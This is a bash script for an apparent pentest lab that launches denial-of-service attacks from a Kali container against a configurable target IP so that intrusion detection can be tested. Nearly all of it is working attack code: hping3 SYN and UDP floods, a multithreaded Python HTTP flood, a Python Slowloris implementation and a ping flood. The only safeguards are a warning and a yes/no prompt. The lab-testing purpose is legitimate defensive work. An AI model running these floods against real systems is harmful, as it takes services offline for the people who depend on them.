#!/bin/bash
# DDOS Attack Testing Script
# Simulates various DDOS attack patterns for IDPS testing
# WARNING: Only use in authorized lab environments

KALI_CONTAINER="pentest-kali"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
OUTPUT_DIR="/root/pentest-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Target configuration
TARGET_IP=${1:-"172.21.0.2"}  # Default to web server
TARGET_PORT=${2:-"80"}
DURATION=${3:-"30"}  # Duration in seconds
ATTACK_TYPE=${4:-"all"}  # all, syn_flood, udp_flood, http_flood, slowloris

echo "=========================================="
echo "DDOS Attack Testing"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Duration: ${DURATION}s"
echo "Attack Type: $ATTACK_TYPE"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="
echo ""
echo "⚠️  WARNING: This script performs DDOS attacks."
echo "   Only use in authorized lab environments!"
echo ""
read -p "Continue? (y/n) " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    exit 1
fi

# Install required tools
echo "Installing required tools..."
docker exec $KALI_CONTAINER sh -c "apt-get update -qq && apt-get install -y -qq hping3 slowhttptest python3 python3-pip curl 2>&1 | grep -v '^WARNING' || true"
docker exec $KALI_CONTAINER sh -c "pip3 install --quiet scapy 2>/dev/null || true"

docker exec $KALI_CONTAINER mkdir -p $OUTPUT_DIR

# Function to run SYN flood attack
syn_flood() {
    echo ""
    echo "=== SYN Flood Attack ==="
    echo "Launching SYN flood against $TARGET_IP:$TARGET_PORT"
    echo "This will send rapid SYN packets to exhaust connection tables"
    
    docker exec -d $KALI_CONTAINER sh -c "
        timeout ${DURATION}s hping3 -S --flood -V -p $TARGET_PORT $TARGET_IP > ${OUTPUT_DIR}/ddos_syn_flood_${TIMESTAMP}.log 2>&1
    "
    
    echo "  ✓ SYN flood started (running for ${DURATION}s)"
    sleep $DURATION
    echo "  ✓ SYN flood completed"
}

# Function to run UDP flood attack
udp_flood() {
    echo ""
    echo "=== UDP Flood Attack ==="
    echo "Launching UDP flood against $TARGET_IP:$TARGET_PORT"
    echo "This will send rapid UDP packets to exhaust resources"
    
    docker exec -d $KALI_CONTAINER sh -c "
        timeout ${DURATION}s hping3 --udp --flood -V -p $TARGET_PORT $TARGET_IP > ${OUTPUT_DIR}/ddos_udp_flood_${TIMESTAMP}.log 2>&1
    "
    
    echo "  ✓ UDP flood started (running for ${DURATION}s)"
    sleep $DURATION
    echo "  ✓ UDP flood completed"
}

# Function to run HTTP flood attack
http_flood() {
    echo ""
    echo "=== HTTP Flood Attack ==="
    echo "Launching HTTP flood against $TARGET_IP:$TARGET_PORT"
    echo "This will send rapid HTTP requests to exhaust web server resources"
    
    # Create Python script for HTTP flood
    docker exec $KALI_CONTAINER sh -c "cat > /tmp/http_flood.py <<'PYEOF'
import socket
import threading
import time
import sys

target_ip = '$TARGET_IP'
target_port = int('$TARGET_PORT')
duration = int('$DURATION')
stop_flag = threading.Event()

def http_request():
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            s.send(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')
            s.recv(1024)
            s.close()
        except:
            pass

threads = []
for i in range(50):
    t = threading.Thread(target=http_request)
    t.daemon = True
    t.start()
    threads.append(t)

time.sleep(duration)
stop_flag.set()
PYEOF
"
    
    docker exec $KALI_CONTAINER python3 /tmp/http_flood.py > "${OUTPUT_DIR}/ddos_http_flood_${TIMESTAMP}.log" 2>&1 &
    FLOOD_PID=$!
    
    echo "  ✓ HTTP flood started (running for ${DURATION}s)"
    sleep $DURATION
    kill $FLOOD_PID 2>/dev/null || true
    echo "  ✓ HTTP flood completed"
}

# Function to run Slowloris attack
slowloris() {
    echo ""
    echo "=== Slowloris Attack ==="
    echo "Launching Slowloris attack against $TARGET_IP:$TARGET_PORT"
    echo "This will send slow HTTP requests to exhaust connection pools"
    
    if docker exec $KALI_CONTAINER which slowhttptest > /dev/null 2>&1; then
        docker exec $KALI_CONTAINER slowhttptest -c 1000 -H -g -o "${OUTPUT_DIR}/ddos_slowloris_${TIMESTAMP}" -i 10 -r 200 -t GET -u "http://${TARGET_IP}:${TARGET_PORT}/" -x 24 -p 3 -l ${DURATION} > "${OUTPUT_DIR}/ddos_slowloris_${TIMESTAMP}.log" 2>&1
        echo "  ✓ Slowloris attack completed"
    else
        echo "  ⚠ slowhttptest not available, using Python implementation"
        
        # Python Slowloris implementation
        docker exec $KALI_CONTAINER sh -c "cat > /tmp/slowloris.py <<'PYEOF'
import socket
import time
import random
import sys

target_ip = '$TARGET_IP'
target_port = int('$TARGET_PORT')
duration = int('$DURATION')
sockets = []

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, target_port))
        s.send(b'GET /?')
        s.send(str(random.randint(0, 2000)).encode())
        s.send(b' HTTP/1.1\r\n')
        s.send(b'Host: ' + target_ip.encode() + b'\r\n')
        s.send(b'User-Agent: Mozilla/4.0\r\n')
        s.send(b'Accept-language: en-US,en,q=0.5\r\n')
        return s
    except:
        return None

start_time = time.time()
while time.time() - start_time < duration:
    try:
        s = create_socket()
        if s:
            sockets.append(s)
        for s in sockets[:]:
            try:
                s.send(b'X-a: ' + str(random.randint(1, 5000)).encode() + b'\r\n')
            except:
                sockets.remove(s)
        time.sleep(15)
    except KeyboardInterrupt:
        break

for s in sockets:
    try:
        s.close()
    except:
        pass
PYEOF
"
        docker exec $KALI_CONTAINER python3 /tmp/slowloris.py > "${OUTPUT_DIR}/ddos_slowloris_${TIMESTAMP}.log" 2>&1
        echo "  ✓ Slowloris attack completed"
    fi
}

# Function to run ICMP flood (Ping flood)
icmp_flood() {
    echo ""
    echo "=== ICMP Flood Attack ==="
    echo "Launching ICMP flood against $TARGET_IP"
    echo "This will send rapid ICMP echo requests"
    
    docker exec -d $KALI_CONTAINER sh -c "
        timeout ${DURATION}s ping -f $TARGET_IP > ${OUTPUT_DIR}/ddos_icmp_flood_${TIMESTAMP}.log 2>&1
    "
    
    echo "  ✓ ICMP flood started (running for ${DURATION}s)"
    sleep $DURATION
    echo "  ✓ ICMP flood completed"
}

# Run attacks based on type
case $ATTACK_TYPE in
    syn_flood)
        syn_flood
        ;;
    udp_flood)
        udp_flood
        ;;
    http_flood)
        http_flood
        ;;
    slowloris)
        slowloris
        ;;
    icmp_flood)
        icmp_flood
        ;;
    all)
        echo "Running all DDOS attack types..."
        syn_flood
        sleep 5
        udp_flood
        sleep 5
        http_flood
        sleep 5
        slowloris
        sleep 5
        icmp_flood
        ;;
    *)
        echo "Unknown attack type: $ATTACK_TYPE"
        echo "Available types: syn_flood, udp_flood, http_flood, slowloris, icmp_flood, all"
        exit 1
        ;;
esac

echo ""
echo "=========================================="
echo "DDOS Attack Testing Complete"
echo "=========================================="
echo ""
echo "Attack logs saved in Kali container:"
echo "  ${OUTPUT_DIR}/ddos_*_${TIMESTAMP}.log"
echo ""
echo "Next steps:"
echo "1. Analyze captured traffic: ./scripts/analyze-pcap.sh <pcap_file>"
echo "2. Review attack patterns in PCAP analysis"
echo "3. Generate IDPS rules from findings"
echo "4. Test IDPS detection capabilities"
